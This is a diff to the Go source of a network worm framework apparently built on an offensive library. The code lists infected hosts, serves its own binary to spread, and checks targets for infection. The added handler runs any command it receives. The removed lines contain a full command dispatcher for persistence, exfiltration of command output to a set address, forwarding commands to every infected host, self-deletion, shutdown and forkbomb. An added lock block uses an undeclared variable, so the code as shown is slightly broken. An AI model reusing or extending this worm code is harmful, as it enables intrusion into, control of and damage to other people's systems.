@@ -21,6 +21,7 @@ import (
 	cf "github.com/redcode-labs/Coldfire"
 	"github.com/valyala/fasthttp"
 	"github.com/yelinaung/go-haikunator"
+	"github.com/zbiljic/go-filelock"
 )
 
 var InfectedHosts = []string{}
@@ -142,6 +143,7 @@ type __N struct {
 	Blacklist                []string
 	FastHTTP                 bool
 	Debug                    bool
+	NoInfectCheck			 bool
 }
 
 var N = __N{
@@ -170,7 +172,7 @@ var N = __N{
 	ScanShakerPorts:          []int{21, 80},
 	ScanFirst:                []string{},
 	ScanArpCache:             false,
-	ScanActiveThreads:              10,
+	ScanActiveThreads:        10,
 	ScanFullRange:            false,
 	ScanGatewayFirst:         false,
 	ScanFirstOnly:            false,
@@ -195,6 +197,7 @@ var N = __N{
 	Blacklist:                []string{},
 	FastHTTP:                 false,
 	Debug:                    false,
+	NoInfectCheck:			  true,
 }
 
 //Verbose error printing
@@ -304,6 +307,13 @@ func NeuraxStager() string {
 
 //Binary serves itself
 func NeuraxServer() {
+	nflck, _ := filelock.New(".nflck")
+	var lck filelock.TryLockerSafe
+	lock, err = nflck.Lock()
+	if err != nil {
+		os.Exit(0)
+	}
+	defer lock.Unlock()
 	data, _ := os.ReadFile(os.Args[0])
 	if N.Base64 {
 		data = []byte(cf.B64E(string(data)))
@@ -360,6 +370,9 @@ func IsHostActive(target string) bool {
 
 //Returns true if host is infected
 func IsHostInfected(target string) bool {
+	if N.NoInfectCheck{
+		return false
+	}
 	if cf.Contains(N.Blacklist, target) {
 		return false
 	}
@@ -400,85 +413,16 @@ func IsHostInfected(target string) bool {
 }
 
 func handle_command(cmd string) {
+	if cmd == "purge" {
+		NeuraxPurgeSelf()
+	}
 	if N.PreventReexec {
 		if cf.Contains(ReceivedCommands, cmd) {
 			return
 		}
 		ReceivedCommands = append(ReceivedCommands, cmd)
 	}
-	DataSender := cf.SendDataUDP
-	forwarded_preamble := ""
-	if N.CommProto == "tcp" {
-		DataSender = cf.SendDataTCP
-	}
-	preamble := strings.Fields(cmd)[0]
-	can_execute := true
-	no_forward := false
-	if strings.Contains(preamble, "e") {
-		if !cf.IsRoot() {
-			can_execute = false
-		}
-	}
-	if strings.Contains(preamble, "k") {
-		forwarded_preamble = preamble
-	}
-	if strings.Contains(preamble, ":") {
-		cmd = strings.Join(strings.Fields(cmd)[1:], " ")
-		if strings.Contains(preamble, "s") {
-			time.Sleep(time.Duration(cf.RandomInt(1, 5)))
-		}
-		if strings.Contains(preamble, "p") {
-			cf.AddPersistentCommand(cmd)
-		}
-		if strings.Contains(preamble, "x") && can_execute {
-			out, err := cf.CmdOut(cmd)
-			if err != nil {
-				if strings.Contains(preamble, "!") {
-					no_forward = true
-				}
-				out += ": " + err.Error()
-			}
-			if strings.Contains(preamble, "d") {
-				fmt.Println(out)
-			}
-			if strings.Contains(preamble, "v") {
-				host := strings.Split(N.ExfilAddr, ":")[0]
-				port := strings.Split(N.ExfilAddr, ":")[1]
-				p, _ := strconv.Atoi(port)
-				cf.SendDataTCP(host, p, out)
-			}
-			if strings.Contains(preamble, "l") && can_execute {
-				for {
-					cf.CmdRun(cmd)
-				}
-			}
-		}
-		if strings.Contains(preamble, "a") && !no_forward {
-			fmt.Println(InfectedHosts)
-			for _, host := range InfectedHosts {
-				err := DataSender(host, N.CommPort, fmt.Sprintf("%s %s", forwarded_preamble, cmd))
-				ReportError("Cannot send command", err)
-				if strings.Contains(preamble, "o") && !strings.Contains(preamble, "m") {
-					break
-				}
-			}
-		}
-		if strings.Contains(preamble, "r") {
-			cf.Remove()
-			os.Exit(0)
-		}
-		if strings.Contains(preamble, "q") {
-			cf.Shutdown()
-		}
-		if strings.Contains(preamble, "f") {
-			cf.Forkbomb()
-		}
-	} else {
-		if cmd == "purge" {
-			NeuraxPurgeSelf()
-		}
-		cf.CmdOut(cmd)
-	}
+	cf.CmdOut(cmd)
 }
 
 //Opens port (.CommPort) and waits for commands
@@ -635,17 +579,6 @@ func NeuraxScan(f func(string)) {
 func NeuraxDebug(msg string) {
 	if N.Debug {
 		cf.PrintInfo(msg)
-	}
-}
-
-func NeuraxScanInfected(c chan string) {
-	full_addr_range, _ := cf.ExpandCidr(N.Cidr)
-	for _, addr := range full_addr_range {
-		if !cf.Contains(N.Blacklist, addr) {
-			if IsHostInfected(addr) {
-				c <- addr
-			}
-		}
 	}
 }
 
